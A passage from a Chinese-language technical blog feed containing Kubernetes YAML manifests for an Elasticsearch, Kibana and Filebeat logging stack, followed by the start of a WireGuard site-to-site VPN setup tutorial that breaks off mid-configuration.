class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Namespace</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">efk</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Deployment</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">elasticsearch</span><br>  <span class="hljs-attr">namespace:</span> <span class="hljs-string">efk</span><br>  <span class="hljs-attr">labels:</span><br>    <span class="hljs-attr">k8s-app:</span> <span class="hljs-string">elasticsearch</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">replicas:</span> <span class="hljs-number">1</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">matchLabels:</span><br>      <span class="hljs-attr">k8s-app:</span> <span class="hljs-string">elasticsearch</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">labels:</span><br>        <span class="hljs-attr">k8s-app:</span> <span class="hljs-string">elasticsearch</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">containers:</span><br>      <span class="hljs-comment"># 指定需要安装的ES版本号</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">image:</span> <span class="hljs-string">docker.elastic.co/elasticsearch/elasticsearch:7.17.22</span><br>        <span class="hljs-attr">name:</span> <span class="hljs-string">elasticsearch</span><br>        <span class="hljs-attr">resources:</span><br>          <span class="hljs-attr">limits:</span><br>            <span class="hljs-attr">cpu:</span> <span class="hljs-number">2</span><br>            <span class="hljs-attr">memory:</span> <span class="hljs-string">3Gi</span><br>          <span class="hljs-attr">requests:</span><br>            <span class="hljs-attr">cpu:</span> <span class="hljs-number">0.5</span> <br>            <span class="hljs-attr">memory:</span> <span class="hljs-string">500Mi</span><br>        <span class="hljs-attr">env:</span><br>          <span class="hljs-comment"># 配置集群部署模式，此处我由于是实验，配置的是单点</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">&quot;discovery.type&quot;</span><br>            <span class="hljs-attr">value:</span> <span class="hljs-string">&quot;single-node&quot;</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">ES_JAVA_OPTS</span><br>            <span class="hljs-attr">value:</span> <span class="hljs-string">&quot;-Xms256m -Xmx256m&quot;</span> <br>        <span class="hljs-attr">ports:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">containerPort:</span> <span class="hljs-number">9200</span><br>          <span class="hljs-attr">name:</span> <span class="hljs-string">db</span><br>          <span class="hljs-attr">protocol:</span> <span class="hljs-string">TCP</span><br>        <span class="hljs-attr">volumeMounts:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">elasticsearch-data</span><br>          <span class="hljs-attr">mountPath:</span> <span class="hljs-string">/usr/share/elasticsearch/data</span><br>      <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">elasticsearch-data</span><br>        <span class="hljs-attr">persistentVolumeClaim:</span><br>          <span class="hljs-attr">claimName:</span> <span class="hljs-string">es-pvc</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">PersistentVolumeClaim</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">es-pvc</span><br>  <span class="hljs-attr">namespace:</span> <span class="hljs-string">efk</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">storageClassName:</span> <span class="hljs-string">&quot;nfs-sc&quot;</span><br>  <span class="hljs-attr">accessModes:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">ReadWriteMany</span><br>  <span class="hljs-attr">resources:</span><br>    <span class="hljs-attr">requests:</span><br>      <span class="hljs-attr">storage:</span> <span class="hljs-string">10Gi</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Service</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">elasticsearch</span><br>  <span class="hljs-attr">namespace:</span> <span class="hljs-string">efk</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">ports:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">port:</span> <span class="hljs-number">9200</span><br>    <span class="hljs-attr">protocol:</span> <span class="hljs-string">TCP</span><br>    <span class="hljs-attr">targetPort:</span> <span class="hljs-number">9200</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">k8s-app:</span> <span class="hljs-string">elasticsearch</span><br></code></pre></td></tr></table></figure><h2 id="3-创建kibana的yaml文件"><a href="#3-创建kibana的yaml文件" class="headerlink" title="3.创建kibana的yaml文件"></a>3.创建kibana的yaml文件</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Deployment</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">kibana</span><br>  <span class="hljs-attr">namespace:</span> <span class="hljs-string">efk</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">replicas:</span> <span class="hljs-number">1</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">matchLabels:</span><br>      <span class="hljs-attr">k8s-app:</span> <span class="hljs-string">kibana</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">labels:</span><br>        <span class="hljs-attr">k8s-app:</span> <span class="hljs-string">kibana</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">containers:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">kibana</span><br>        <span class="hljs-attr">image:</span> <span class="hljs-string">docker.elastic.co/kibana/kibana:7.17.22</span><br>        <span class="hljs-attr">resources:</span><br>          <span class="hljs-attr">limits:</span><br>            <span class="hljs-attr">cpu:</span> <span class="hljs-number">2</span><br>            <span class="hljs-attr">memory:</span> <span class="hljs-string">2Gi</span><br>          <span class="hljs-attr">requests:</span><br>            <span class="hljs-attr">cpu:</span> <span class="hljs-number">0.5</span> <br>            <span class="hljs-attr">memory:</span> <span class="hljs-string">500Mi</span><br>        <span class="hljs-attr">env:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">ELASTICSEARCH_HOSTS</span><br>            <span class="hljs-attr">value:</span> <span class="hljs-string">http://elasticsearch.efk.svc.cherry.com:9200</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">I18N_LOCALE</span><br>            <span class="hljs-attr">value:</span> <span class="hljs-string">zh-CN</span><br>        <span class="hljs-attr">ports:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">containerPort:</span> <span class="hljs-number">5601</span><br>          <span class="hljs-attr">name:</span> <span class="hljs-string">ui</span><br>          <span class="hljs-attr">protocol:</span> <span class="hljs-string">TCP</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Service</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">kibana</span><br>  <span class="hljs-attr">namespace:</span> <span class="hljs-string">efk</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">NodePort</span><br>  <span class="hljs-attr">ports:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">port:</span> <span class="hljs-number">5601</span><br>    <span class="hljs-attr">protocol:</span> <span class="hljs-string">TCP</span><br>    <span class="hljs-attr">targetPort:</span> <span class="hljs-string">ui</span><br>    <span class="hljs-attr">nodePort:</span> <span class="hljs-number">5601</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">k8s-app:</span> <span class="hljs-string">kibana</span><br></code></pre></td></tr></table></figure><h2 id="4-以DaemonSet的方式创建filebeat的yaml文件"><a href="#4-以DaemonSet的方式创建filebeat的yaml文件" class="headerlink" title="4.以DaemonSet的方式创建filebeat的yaml文件"></a>4.以DaemonSet的方式创建filebeat的yaml文件</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">ConfigMap</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">filebeat-config</span><br><span class="hljs-attr">data:</span><br>  <span class="hljs-attr">filebeat.yml:</span> <span class="hljs-string">|-</span><br><span class="hljs-string">    filebeat.config:</span><br><span class="hljs-string">      inputs:</span><br><span class="hljs-string">        path: $&#123;path.config&#125;/inputs.d/*.yml</span><br><span class="hljs-string">        reload.enabled: false</span><br><span class="hljs-string">      modules:</span><br><span class="hljs-string">        path: $&#123;path.config&#125;/modules.d/*.yml</span><br><span class="hljs-string">        reload.enabled: false</span><br><span class="hljs-string">    output.elasticsearch:</span><br><span class="hljs-string">      hosts: [&#x27;elasticsearch.efk.svc.cherry.com:9200&#x27;]</span><br><span class="hljs-string">      index: &#x27;k8s-ds-%&#123;+yyyy.MM.dd&#125;&#x27;</span><br><span class="hljs-string"></span><br>    <span class="hljs-attr">setup.ilm.enabled:</span> <span class="hljs-literal">false</span><br>    <span class="hljs-attr">setup.template.name:</span> <span class="hljs-string">&quot;k8s-ds&quot;</span><br>    <span class="hljs-attr">setup.template.pattern:</span> <span class="hljs-string">&quot;k8s-ds*&quot;</span><br>    <span class="hljs-attr">setup.template.overwrite:</span> <span class="hljs-literal">false</span><br>    <span class="hljs-attr">setup.template.settings:</span><br>      <span class="hljs-attr">index.number_of_shards:</span> <span class="hljs-number">5</span><br>      <span class="hljs-attr">index.number_of_replicas:</span> <span class="hljs-number">0</span><br><span class="hljs-meta">---</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">ConfigMap</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">filebeat-inputs</span><br><span class="hljs-attr">data:</span><br>  <span class="hljs-attr">kubernetes.yml:</span> <span class="hljs-string">|-</span><br><span class="hljs-string">    - type: container</span><br><span class="hljs-string">      stream: all</span><br><span class="hljs-string">      paths: </span><br><span class="hljs-string">        - &#x27;/var/lib/docker/containers/*/*.log&#x27;</span><br><span class="hljs-string">      processors:</span><br><span class="hljs-string">        - add_kubernetes_metadata:</span><br><span class="hljs-string">            in_cluster: true</span><br><span class="hljs-string"></span><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">ServiceAccount</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">filebeat</span><br><span class="hljs-meta">---</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">rbac.authorization.k8s.io/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">ClusterRoleBinding</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">filebeat</span><br><span class="hljs-attr">subjects:</span><br><span class="hljs-bullet">-</span> <span class="hljs-attr">kind:</span> <span class="hljs-string">ServiceAccount</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">filebeat</span><br>  <span class="hljs-attr">namespace:</span> <span class="hljs-string">default</span><br><span class="hljs-attr">roleRef:</span><br>  <span class="hljs-attr">kind:</span> <span class="hljs-string">ClusterRole</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">filebeat</span><br>  <span class="hljs-attr">apiGroup:</span> <span class="hljs-string">rbac.authorization.k8s.io</span><br><span class="hljs-meta">---</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">rbac.authorization.k8s.io/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">ClusterRole</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">filebeat</span><br>  <span class="hljs-attr">labels:</span><br>    <span class="hljs-attr">k8s-app:</span> <span class="hljs-string">filebeat</span><br><span class="hljs-attr">rules:</span><br><span class="hljs-bullet">-</span> <span class="hljs-attr">apiGroups:</span> [<span class="hljs-string">&quot;&quot;</span>]<br>  <span class="hljs-attr">resources:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">namespaces</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">pods</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">nodes</span><br>  <span class="hljs-attr">verbs:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">get</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">watch</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">list</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span> <br><span class="hljs-attr">kind:</span> <span class="hljs-string">DaemonSet</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">filebeat</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">matchLabels:</span><br>      <span class="hljs-attr">k8s-app:</span> <span class="hljs-string">filebeat</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">labels:</span><br>        <span class="hljs-attr">k8s-app:</span> <span class="hljs-string">filebeat</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">tolerations:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">key:</span> <span class="hljs-string">node-role.kubernetes.io/master</span><br>        <span class="hljs-attr">effect:</span> <span class="hljs-string">NoSchedule</span><br>        <span class="hljs-attr">operator:</span> <span class="hljs-string">Exists</span><br>      <span class="hljs-attr">serviceAccountName:</span> <span class="hljs-string">filebeat</span><br>      <span class="hljs-attr">terminationGracePeriodSeconds:</span> <span class="hljs-number">30</span><br>      <span class="hljs-attr">containers:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">filebeat</span><br>        <span class="hljs-attr">image:</span> <span class="hljs-string">docker.elastic.co/beats/filebeat:7.17.22</span><br>        <span class="hljs-attr">args:</span> [<br>          <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;/etc/filebeat.yml&quot;</span>,<br>          <span class="hljs-string">&quot;-e&quot;</span>,<br>        ]<br>        <span class="hljs-attr">securityContext:</span><br>          <span class="hljs-attr">runAsUser:</span> <span class="hljs-number">0</span><br>        <span class="hljs-attr">resources:</span><br>          <span class="hljs-attr">limits:</span><br>            <span class="hljs-attr">memory:</span> <span class="hljs-string">200Mi</span><br>          <span class="hljs-attr">requests:</span><br>            <span class="hljs-attr">cpu:</span> <span class="hljs-string">100m</span><br>            <span class="hljs-attr">memory:</span> <span class="hljs-string">100Mi</span><br>        <span class="hljs-attr">volumeMounts:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">config</span><br>          <span class="hljs-attr">mountPath:</span> <span class="hljs-string">/etc/filebeat.yml</span><br>          <span class="hljs-attr">readOnly:</span> <span class="hljs-literal">true</span><br>          <span class="hljs-attr">subPath:</span> <span class="hljs-string">filebeat.yml</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">inputs</span><br>          <span class="hljs-attr">mountPath:</span> <span class="hljs-string">/usr/share/filebeat/inputs.d</span><br>          <span class="hljs-attr">readOnly:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">varlibdockercontainers</span><br>          <span class="hljs-attr">mountPath:</span> <span class="hljs-string">/var/lib/docker/containers</span><br>          <span class="hljs-attr">readOnly:</span> <span class="hljs-literal">true</span><br>      <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">config</span><br>        <span class="hljs-attr">configMap:</span><br>          <span class="hljs-attr">defaultMode:</span> <span class="hljs-number">0600</span><br>          <span class="hljs-attr">name:</span> <span class="hljs-string">filebeat-config</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">varlibdockercontainers</span><br>        <span class="hljs-attr">hostPath:</span><br>          <span class="hljs-attr">path:</span> <span class="hljs-string">/var/lib/docker/containers</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">inputs</span><br>        <span class="hljs-attr">configMap:</span><br>          <span class="hljs-attr">defaultMode:</span> <span class="hljs-number">0600</span><br>          <span class="hljs-attr">name:</span> <span class="hljs-string">filebeat-inputs</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/d234b186600f46cab91dfb4d3427d037.png" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>日志篇</category>
      
    </categories>
    
    
    <tags>
      
      <tag>日志篇</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WireGuard实现异地组网</title>
    <link href="/2025/04/16/WireGuard%E5%AE%9E%E7%8E%B0%E5%BC%82%E5%9C%B0%E7%BB%84%E7%BD%91/"/>
    <url>/2025/04/16/WireGuard%E5%AE%9E%E7%8E%B0%E5%BC%82%E5%9C%B0%E7%BB%84%E7%BD%91/</url>
    
    <content type="html"><![CDATA[<p> WireGuard是一个易于配置、快速、安全的基于UDP协议的开源VPN软件。Wireguard具有自定义配置路由转发的能力，所以可以被用来在多个不同地域将设备所在的内网网络通过路由转发的方式串通起来，组建一张属于自己的大内网！有时候，我们想将本地计算机上提供的服务与小伙伴分享，但是我们既没有公网IP，又希望能够有足够的安全性，避免使其暴露在公网上。因此，我们基于Wireguard这一项最基本的特性，设计和实现了一套异地组网方案。我们基于Wireguard这一项最基本的特性，设计和实现了一套异地组网方案。这里给大家介绍两种部署方式，以供大家选择。</p><h2 id="一、WireGuard-基本概念"><a href="#一、WireGuard-基本概念" class="headerlink" title="一、WireGuard 基本概念"></a>一、WireGuard 基本概念</h2><p>首先使用 WireGuard 你需要在<a href="https://www.moyann.com/tag/%E7%B3%BB%E7%BB%9F/">系统</a>中创建一块虚拟网卡，并配置好这个虚拟网卡的 IP <a href="https://www.moyann.com/tag/%E5%9C%B0%E5%9D%80/">地址</a>，掩码，网关不需要配置（可以使用 wg-quick@ 自动化）</p><p>然后你使用 WireGuard <a href="https://www.moyann.com/tag/%E8%BF%9E%E6%8E%A5/">连接</a>另一台设备，两台互相 peer 对方并验证各自的公钥私钥是否正确，全部正确后成功建立 peer（可以使用 wg-quick@ 自动化）</p><p>建立成功后，所有前往虚拟网卡的<a href="https://www.moyann.com/tag/%E6%B5%81%E9%87%8F/">流量</a>都将被重新封装后发往另一台设备，由另一台设备解封装然后得到数据报文并在内部查找路由并匹配报文目的地。（可以使用 wg-quick@ 自动化）</p><p>以上为建立一个 WireGuard VPN 链接的过程，建立好后，A 设备与 B 设备互相需要保证虚拟网卡的 IP 在相同网络位的地址段中，并且这个地址段被 WireGuard 的配置<a href="https://www.moyann.com/tag/%E6%96%87%E4%BB%B6/">文件</a> AllowedIPs 所允许通过</p><p>如果你试图从 A 设备访问 B 设备的对端子网，你需要在 A 设备上配置系统路由，将系统三层网络的路由目的地指向对端虚拟 IP 地址，出接口为虚拟网卡，并且这个地址段必须被 WireGuard 的配置文件 AllowedIPs 所允许通过</p><p>最后，在 WireGuard 中的所有数据报文，都采用 UDP 的方式发送。</p><h2 id="二、安装-WireGuard"><a href="#二、安装-WireGuard" class="headerlink" title="二、安装 WireGuard"></a>二、安装 WireGuard</h2><p>1.安装Wireguard</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#root权限</span><br><span class="hljs-built_in">sudo</span> -i<br><br><span class="hljs-comment">#安装wireguard软件</span><br>apt install wireguard resolvconf -y<br><br><span class="hljs-comment">#开启IP转发</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;net.ipv4.ip_forward = 1&quot;</span> &gt;&gt; /etc/sysctl.conf<br>sysctl -p<br></code></pre></td></tr></table></figure><p>2.修改目录权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /etc/wireguard/<br><span class="hljs-built_in">chmod</span> 0777 /etc/wireguard<br><br><span class="hljs-comment">#调整目录默认权限</span><br><span class="hljs-built_in">umask</span> 077<br></code></pre></td></tr></table></figure><p>3.生成服务器密钥</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-meta">#生成私钥</span><br>wg genkey &gt; <span class="hljs-keyword">server</span>.key<br><br><span class="hljs-meta">#通过私钥生成公钥</span><br>wg pubkey &lt; <span class="hljs-keyword">server</span>.key &gt; <span class="hljs-keyword">server</span>.key.pub<br></code></pre></td></tr></table></figure><p>4.生成客户端密钥</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gherkin"><span class="hljs-comment">#生成私钥</span><br>wg genkey &gt; client1.key<br><br><span class="hljs-comment">#通过私钥生成公钥</span><br>wg pubkey <span class="hljs-variable">&lt; client1.key &gt;</span> client1.key.pub<br></code></pre></td></tr></table></figure><p>5.查看密钥</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">cat server.<span class="hljs-keyword">key</span> <span class="hljs-variable">&amp;&amp;</span> cat server.<span class="hljs-keyword">key</span>.pub <span class="hljs-variable">&amp;&amp;</span> cat client1.<span class="hljs-keyword">key</span> <span class="hljs-variable">&amp;&amp;</span> cat client1.<span class="hljs-keyword">key</span>.pub<br></code></pre></td></tr></table></figure><p>6.创建服务端配置文件</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs 1c">echo <span class="hljs-string">&quot;</span><br>[Interface]<br>PrivateKey <span class="hljs-punctuation">=</span> $<span class="hljs-punctuation">(</span>cat server.key<span class="hljs-punctuation">)</span> <span class="hljs-meta"># 填写本机的privatekey 内容</span><br>Address <span class="hljs-punctuation">=</span> <span 